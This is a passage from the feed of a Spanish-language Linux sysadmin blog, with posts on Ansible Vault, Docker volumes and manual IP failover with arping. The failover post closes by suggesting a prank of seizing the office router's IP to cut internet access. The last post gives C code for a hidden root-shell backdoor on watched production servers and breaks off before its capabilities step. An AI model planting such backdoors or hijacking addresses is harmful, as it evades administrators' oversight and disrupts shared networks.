slave2 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es importante recalcar que solo se puede indicar una contraseña para nuestros &lt;em&gt;vaults&lt;/em&gt;, sea por el terminal o por un fichero. Eso significa que todas las contraseñas usadas en un mismo comando deben ser las mismas.&lt;/p&gt;
&lt;h2&gt;Limpiando nuestras líneas de comandos&lt;/h2&gt;
&lt;p&gt;si el fichero de la &lt;em&gt;password&lt;/em&gt; es siempre el mismo, nuestros comandos van a ser largos y repetitivos. La gracia es que podemos ocultar los parámetros permanentes en el fichero de configuración de &lt;strong&gt;ansible&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat .ansible.cfg &lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;defaults&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;host_key_checking&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; False
&lt;span class="nv"&gt;vault_password_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; .vault-passfile
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta forma, podemos omitirlo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# ansible -i inventory/ -m ping slaves&lt;/span&gt;
slave1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
slave2 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, este parámetro también afecta a otras herramientas, como por ejemplo el mismo comando &lt;strong&gt;ansible-vault&lt;/strong&gt;, por ejemplo, para inspeccionar el fichero encriptado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat inventory/vault &lt;/span&gt;
&lt;span class="nv"&gt;$ANSIBLE_VAULT&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.1&lt;span class="p"&gt;;&lt;/span&gt;AES256
&lt;span class="m"&gt;30313636313462346536346262333462633131633666653238313239333330343036346263653962&lt;/span&gt;
3862623363393436656334636361303263336333363431610a346666653539643065383765613466
&lt;span class="m"&gt;64626437633565323866316466636166623432313630323362393961383663356233626263386530&lt;/span&gt;
3539353266343237310a396536326337313232663466333361316666376364323634623638353865
&lt;span class="m"&gt;66323636336137303863643736636666353631613230633231386434373266343764343730653238&lt;/span&gt;
&lt;span class="m"&gt;38643462636330663864626237366631346439303739323030306336396266366666303262363735&lt;/span&gt;
&lt;span class="m"&gt;30303034333532336532306432643265653963646132393939386561326539646566613961393963&lt;/span&gt;
&lt;span class="m"&gt;62363633626135376532336137373631383839393231356265653932333639343762353937356439&lt;/span&gt;
&lt;span class="m"&gt;64346465323263623830306436636134613561646232663664306262383136646265383834306336&lt;/span&gt;
&lt;span class="m"&gt;62646537666135393032306338313166316631303134363363633833663862663933366436613461&lt;/span&gt;
&lt;span class="m"&gt;35343039646430393235383238653733343465653863363835303537383437613933306137636161&lt;/span&gt;
&lt;span class="m"&gt;37643432373531613565633431636461666661343561393764376239313637663362333136363237&lt;/span&gt;
&lt;span class="m"&gt;3131&lt;/span&gt;
~ &lt;span class="c1"&gt;# ansible-vault view inventory/vault&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;slaves:vars&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;ansible_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; ansible
&lt;span class="nv"&gt;ansible_ssh_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t
&lt;span class="nv"&gt;ansible_become&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
&lt;span class="nv"&gt;ansible_become_method&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; sudo
&lt;span class="nv"&gt;ansible_become_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; root
&lt;span class="nv"&gt;ansible_become_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, también sirve para encriptar, de forma que si lo hubiésemos puesto al principio, ni siquiera tendríamos que usarla para esa función. Para ir mas lejos, podríamos haber generado la &lt;em&gt;password&lt;/em&gt; de forma aleatorio y/o automatizada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat aaaa &lt;/span&gt;
lorem ipsum
~ &lt;span class="c1"&gt;# ansible-vault encrypt aaaa &lt;/span&gt;
Encryption successful
~ &lt;span class="c1"&gt;# cat aaaa &lt;/span&gt;
&lt;span class="nv"&gt;$ANSIBLE_VAULT&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.1&lt;span class="p"&gt;;&lt;/span&gt;AES256
&lt;span class="m"&gt;38666531306261623531363836623436333061326536323066386139643630323336336565626663&lt;/span&gt;
6238383334333666376338363366353066333763393330340a353365343234646430393236356464
&lt;span class="m"&gt;62346166356430346564343539313436346661656335343733623836663563633630346138636661&lt;/span&gt;
3838633536383934360a343232306237373864616237386164376136323737373739623062306562
&lt;span class="m"&gt;3964&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto nos quedan los ficheros sensibles un poco mas protegidos, aunque no tenemos porque encriptarlos todos.&lt;/p&gt;</content><category term="ansible"></category><category term="vault"></category><category term="encriptación"></category><category term="inventario"></category></entry><entry><title>Tipos de volúmenes en Docker</title><link href="https://www.linuxsysadmin.ml/2016/07/tipos-de-volumenes-en-docker.html" rel="alternate"></link><published>2016-07-18T08:00:00+02:00</published><updated>2016-07-18T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-07-18:/2016/07/tipos-de-volumenes-en-docker.html</id><summary type="html">&lt;p&gt;Una de las mas importantes funcionalidades de &lt;strong&gt;Docker&lt;/strong&gt; son los volúmenes. Estos no son mas que carpetas en nuestro sistema de ficheros y son capaces de sobrevivir al ciclo de vida normal del contenedor. Eso nos permite, entre otras cosas, compartir varios ficheros con otros contenedores o con el &lt;em&gt;host …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Una de las mas importantes funcionalidades de &lt;strong&gt;Docker&lt;/strong&gt; son los volúmenes. Estos no son mas que carpetas en nuestro sistema de ficheros y son capaces de sobrevivir al ciclo de vida normal del contenedor. Eso nos permite, entre otras cosas, compartir varios ficheros con otros contenedores o con el &lt;em&gt;host&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Los volúmenes son bastante útiles porque permiten compartirse entre contenedores, o el propio &lt;em&gt;host&lt;/em&gt;. Eso nos permite consultar todos los &lt;em&gt;logs&lt;/em&gt; cómodamente desde un contenedor dedicado, hacer &lt;em&gt;backups&lt;/em&gt; de un contenedor desde otro dedicado, o recuperar esos mismo &lt;em&gt;backups&lt;/em&gt; hacia nuestro &lt;em&gt;host&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;De hecho, he visto contenedores con la única función de producir ficheros (&lt;em&gt;.tar.gz&lt;/em&gt;, &lt;em&gt;.deb&lt;/em&gt;, ...) en volúmenes que luego son consumidos por servicios de &lt;em&gt;runtime&lt;/em&gt;, por ejemplo un servidor web, un repositorio o simplemente un NFS.&lt;/p&gt;
&lt;p&gt;Los volúmenes pueden ser de 3 tipos distintos, y se categorizan según esta lista:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Data volumes&lt;ul&gt;
&lt;li&gt;Anonymous data volumes&lt;/li&gt;
&lt;li&gt;Named data volumes&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mounted volumes&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Data volumes&lt;/h2&gt;
&lt;p&gt;Se trata de carpetas que se crean en &lt;em&gt;/var/lib/docker/&lt;/em&gt; y que pueden compartirse entre diferentes contenedores.&lt;/p&gt;
&lt;h3&gt;Anonymous data volumes&lt;/h3&gt;
&lt;p&gt;Se crean cuando se levanta un contenedor, mediante el comando &lt;em&gt;docker run&lt;/em&gt;, por ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ docker run -ti --rm -v /data alpine:3.4 sh
/ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto nos crea un volumen asociado al contenedor creado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@sirius:~# docker volume ls
DRIVER              VOLUME NAME
&lt;span class="nb"&gt;local&lt;/span&gt;               1b39e6601cd3711c27f3a1a4eb50d82e182151fd14b82048f47b0d50ad22b97a
root@sirius:~# tree /var/lib/docker/volumes/
/var/lib/docker/volumes/
├── 1b39e6601cd3711c27f3a1a4eb50d82e182151fd14b82048f47b0d50ad22b97a
│   └── _data
└── metadata.db

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;1&lt;/span&gt; file
root@sirius:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A su vez, otro contenedor puede montar los volúmenes de otro contenedor, ya sea porque los creó o porque los ha montado de un tercero.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@sirius:~# docker run -ti --rm --volumes-from adoring_lovelace alpine:3.4 sh
/ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora mismo, la carpeta &lt;em&gt;/data/&lt;/em&gt; pertenece al primer contendor, pero es la misma para ambos contenedores.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Docker&lt;/strong&gt; mantiene una cuenta de los contenedores que están usando un volumen, y estos solo se eliminan cuando el último contenedor que lo usa sale con el parámetro &lt;em&gt;--rm&lt;/em&gt; o si se hace un &lt;em&gt;docker rm -v&lt;/em&gt;. En cualquier otro caso, el volumen se queda parasitando, hasta que lo eliminamos manualmente usado &lt;em&gt;docker volume rm&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;Named data volumes&lt;/h3&gt;
&lt;p&gt;Estos volúmenes no dependen de ningún contenedor concreto, y se pueden montar en cualquier contenedor. Se crean específicamente usando el comando &lt;em&gt;docker volume create&lt;/em&gt;, o al ejecutar un contenedor si le damos un nombre en la línea de comandos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ docker volume create --name vol1
vol1
gerard@sirius:~$ docker run -ti --rm -v vol2:/data alpine:3.4 &lt;span class="nb"&gt;true&lt;/span&gt;
gerard@sirius:~$ docker volume ls
DRIVER              VOLUME NAME
&lt;span class="nb"&gt;local&lt;/span&gt;               vol1
&lt;span class="nb"&gt;local&lt;/span&gt;               vol2
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Estos volúmenes no se eliminan por si solos nunca y persisten cuando su contenedor desaparece. Para eliminarlos se necesita una intervención manual mediante el comando &lt;em&gt;docker volume rm&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ docker volume ls
DRIVER              VOLUME NAME
&lt;span class="nb"&gt;local&lt;/span&gt;               vol1
&lt;span class="nb"&gt;local&lt;/span&gt;               vol2
gerard@sirius:~$ docker volume rm vol1 vol2
vol1
vol2
gerard@sirius:~$ docker volume ls
DRIVER              VOLUME NAME
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Mounted volumes&lt;/h2&gt;
&lt;p&gt;Otras veces nos interesa montar ficheros o carpetas desde la máquina &lt;em&gt;host&lt;/em&gt;. En este caso, podemos montar la carpeta o el fichero especificando la ruta completa desde la máquina &lt;em&gt;host&lt;/em&gt;, y la ruta completa en el contenedor. Es posible también especificar si el volumen es de lectura y escritura (por defecto) o de solo lectura.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker$ docker run -ti --rm -v /etc/hostname:/root/parent_name:ro -v /opt/:/data alpine:3.4 sh
/ &lt;span class="c1"&gt;# cat /root/parent_name &lt;/span&gt;
sirius
/ &lt;span class="c1"&gt;# ls /data/&lt;/span&gt;
/ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Este último caso es ideal para recuperar &lt;em&gt;backups&lt;/em&gt; o ficheros generados en un contenedor, en vistas a su utilización futura por parte de otros contenedores o del mismo &lt;em&gt;host&lt;/em&gt;.&lt;/p&gt;</content><category term="docker"></category><category term="volumenes"></category></entry><entry><title>Dirección IP compartida manualmente entre servidores</title><link href="https://www.linuxsysadmin.ml/2016/07/direccion-ip-compartida-manualmente-entre-servidores.html" rel="alternate"></link><published>2016-07-11T08:00:00+02:00</published><updated>2016-07-11T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-07-11:/2016/07/direccion-ip-compartida-manualmente-entre-servidores.html</id><summary type="html">&lt;p&gt;Cuando hablamos de alta disponibilidad, uno de los métodos mas utilizados es el &lt;strong&gt;failover&lt;/strong&gt;. La idea es que una de las máquinas es la que asume la totalidad del servicio, y el resto están preparadas para ejercer la misma función en el caso de que la primera deje de funcionar …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando hablamos de alta disponibilidad, uno de los métodos mas utilizados es el &lt;strong&gt;failover&lt;/strong&gt;. La idea es que una de las máquinas es la que asume la totalidad del servicio, y el resto están preparadas para ejercer la misma función en el caso de que la primera deje de funcionar.&lt;/p&gt;
&lt;p&gt;En este campo hay varias soluciones como &lt;strong&gt;keepalived&lt;/strong&gt; y &lt;strong&gt;pacemaker&lt;/strong&gt;, pero en este artículo se pretende mostrar los conceptos mas básicos; haciendo manualmente los pasos y entendiendo como funciona todo, desde un punto de vista didáctico.&lt;/p&gt;
&lt;p&gt;Realmente esto es un intento mío para hacer una solución de alta disponibilidad, pero se quedó a medias. Lo escribo porque creo que puede ser útil en otro momento.&lt;/p&gt;
&lt;h2&gt;Punto de partida&lt;/h2&gt;
&lt;p&gt;Tenemos dos servidores normales, que vamos a convertir en un &lt;strong&gt;cluster&lt;/strong&gt; con configuración manual de &lt;strong&gt;failover&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# lxc-ls -f
NAME     STATE    IPV4      IPV6  AUTOSTART
-------------------------------------------
server1  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3  -     NO
server2  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4  -     NO
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Digamos que queremos dar un servicio web, aunque podríamos hacer de balanceadores, servidores de aplicación o lo que se necesite, en general.&lt;/p&gt;
&lt;p&gt;Vamos a poner un servidor web &lt;strong&gt;nginx&lt;/strong&gt;, que sirva una página HTML que nos indique la máquina que recibe las peticiones, a modo de comprobación.&lt;/p&gt;
&lt;p&gt;Vamos a instalar el servicio &lt;strong&gt;nginx&lt;/strong&gt; en ambas máquinas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server1:~# apt-get install -y nginx-light
...  
root@server1:~#

root@server2:~# apt-get install -y nginx-light
...  
root@server2:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Creamos una página HTML con el nombre de cada máquina para ver quien recibe la petición HTTP:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server1:~# hostname &amp;gt; /var/www/html/index.html
root@server1:~#

root@server2:~# hostname &amp;gt; /var/www/html/index.html
root@server2:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y comprobamos que podemos diferenciar el servidor destino que recibe cada una de las peticiones:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# wget -qO- http://10.0.0.3/
server1
root@lxc:~# wget -qO- http://10.0.0.4/
server2
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Moviendo la dirección IP compartida&lt;/h2&gt;
&lt;p&gt;Además de la dirección IP de cada máquina, vamos a tener una que represente al miembro activo del &lt;strong&gt;cluster&lt;/strong&gt;, que por ejemplo, será la 10.0.0.2&lt;/p&gt;
&lt;p&gt;Si solo una de las máquinas tiene esa dirección IP asignada, el truco ya está hecho. Sin embargo, ¿que pasará si los dos nodos tienen la dirección IP compartida asignada? Puede pasará cualquier cosa.&lt;/p&gt;
&lt;p&gt;Para evitar este caso, un nodo que asuma el rol de primario también va a forzar a sus vecinos a actualizar sus tablas ARP, consiguiendo así &lt;strong&gt;robar&lt;/strong&gt; la dirección IP. Esto se puede conseguir con el comando &lt;strong&gt;arping&lt;/strong&gt; y por lo tanto, hay que instalarlo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server1:~# apt-get install -y iputils-arping
...  
root@server1:~#

root@server2:~# apt-get install -y iputils-arping
...  
root@server2:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Promocionando server1 a primario&lt;/h3&gt;
&lt;p&gt;El proceso de &lt;strong&gt;failover&lt;/strong&gt; consiste en agenciarse la dirección compartida. Para ello, tenemos que añadir una nueva dirección IP en nuestra interfaz de red. Como es posible que esta IP pertenezca a otro servidor, hay que lanzar el comando &lt;strong&gt;arping&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server1:~# ip addr add &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2/24 dev eth0
root@server1:~# arping -U -c1 &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
ARPING &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2 from &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2 eth0
Sent &lt;span class="m"&gt;1&lt;/span&gt; probes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; broadcast&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;))&lt;/span&gt;
Received &lt;span class="m"&gt;0&lt;/span&gt; response&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;
root@server1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El siguiente paso, aunque opcional, es educado; el servidor desplazado de primario a reserva, no necesita tener esa dirección asignada, en caso de que la tuviera (que no es el caso, pero no importa y lo ignoramos).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server2:~# ip addr del &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2/24 dev eth0
RTNETLINK answers: Cannot assign requested address
root@server2:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El resultado es que &lt;em&gt;server1&lt;/em&gt; tiene dos direcciones asignadas: la suya propia y la compartida, mientras que &lt;em&gt;server2&lt;/em&gt; solo tiene la suya.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# lxc-ls -f
NAME     STATE    IPV4                IPV6  AUTOSTART
-----------------------------------------------------
server1  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2, &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3  -     NO
server2  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4            -     NO
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y nuestras peticiones web, caen efectivamente en &lt;em&gt;server1&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# wget -qO- http://10.0.0.2/
server1
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Cambiando el primario de server1 a server2&lt;/h3&gt;
&lt;p&gt;El proceso es el mismo, pero al revés: &lt;em&gt;server2&lt;/em&gt; reclama la dirección compartida y &lt;em&gt;server1&lt;/em&gt; se deshace de ella por cortesía.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server2:~# ip addr add &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2/24 dev eth0
root@server2:~# arping -U -c1 &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
ARPING &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2 from &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2 eth0
Sent &lt;span class="m"&gt;1&lt;/span&gt; probes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; broadcast&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;))&lt;/span&gt;
Received &lt;span class="m"&gt;0&lt;/span&gt; response&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;
root@server2:~#

root@server1:~# ip addr del &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2/24 dev eth0
root@server1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y nuevamente, podemos ver donde está la dirección compartida y en que servidor caen nuestras peticiones.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# lxc-ls -f
NAME     STATE    IPV4                IPV6  AUTOSTART
-----------------------------------------------------
server1  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3            -     NO
server2  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2, &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4  -     NO
root@lxc:~#

root@lxc:~# wget -qO- http://10.0.0.2/
server2
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Usos poco éticos de esta técnica&lt;/h2&gt;
&lt;p&gt;Estamos en nuestra oficina y no queremos trabajar, con la excusa de que no hay internet. ¿Que nos impide asignarnos la dirección del &lt;em&gt;router&lt;/em&gt; a nuestra máquina? Esto haría que toda la oficina usara nuestra máquina de &lt;em&gt;gateway&lt;/em&gt;, que por supuesto, no sabe salir a internet, cortando efectivamente el tráfico exterior.&lt;/p&gt;
&lt;p&gt;Parece que esta idea ya se les ocurrió a los fabricantes de &lt;em&gt;routers&lt;/em&gt;, así que sus productos ya se preocupan de ir reclamando su dirección IP. Así que os puede funcionar puntualmente, y si queréis hacer la broma por un periodo largo, tendréis que librar una batalla de &lt;em&gt;arpings&lt;/em&gt; contra el &lt;em&gt;router&lt;/em&gt;.&lt;/p&gt;</content><category term="linux"></category><category term="failover"></category><category term="arping"></category></entry><entry><title>Un root shell en C</title><link href="https://www.linuxsysadmin.ml/2016/06/un-root-shell-en-c.html" rel="alternate"></link><published>2016-06-13T08:00:00+02:00</published><updated>2016-06-13T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-06-13:/2016/06/un-root-shell-en-c.html</id><summary type="html">&lt;p&gt;Cuando operamos un servidor de producción es habitual que no tengamos acceso habitual al usuario &lt;em&gt;root&lt;/em&gt;, e incluso lo tengan altamente vigilado. Podemos intentar dejar una puerta trasera, por ejemplo poniendo un binario con el &lt;em&gt;setuid&lt;/em&gt; bit activado, te pueden pillar. Sin embargo es posible dejar una puerta abierta oculta …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando operamos un servidor de producción es habitual que no tengamos acceso habitual al usuario &lt;em&gt;root&lt;/em&gt;, e incluso lo tengan altamente vigilado. Podemos intentar dejar una puerta trasera, por ejemplo poniendo un binario con el &lt;em&gt;setuid&lt;/em&gt; bit activado, te pueden pillar. Sin embargo es posible dejar una puerta abierta oculta.&lt;/p&gt;
&lt;p&gt;El truco esta en las &lt;em&gt;linux capabilities&lt;/em&gt;, que nos permiten dar permisos para operaciones concretas a binarios concretos; así pues, no es necesario ejecutar el binario con el usuario &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;El resto es tan fácil como hacer un binario que escale a &lt;em&gt;root&lt;/em&gt; y luego ejecute lo que necesitamos, por ejemplo, una línea de comandos &lt;strong&gt;bash&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Aquí ponemos el código fuente necesario para hacer lo que pretendemos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ cat root_shell.c
int main&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    setuid&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    system&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;bash&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La compilación no tiene ningún misterio; lo compilamos con &lt;strong&gt;gcc&lt;/strong&gt; y le pasamos un &lt;strong&gt;strip&lt;/strong&gt; para reducir el tamaño al máximo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ gcc -o root_shell root_shell.c
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ strip root_shell
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si tratamos de ejecutarlo, veremos que la llamada para escalar a &lt;em&gt;root&lt;/em&gt; ha sido ignorada; el usuario que hemos usado no tiene permisos para hacer eso.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ ./root_shell
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ id
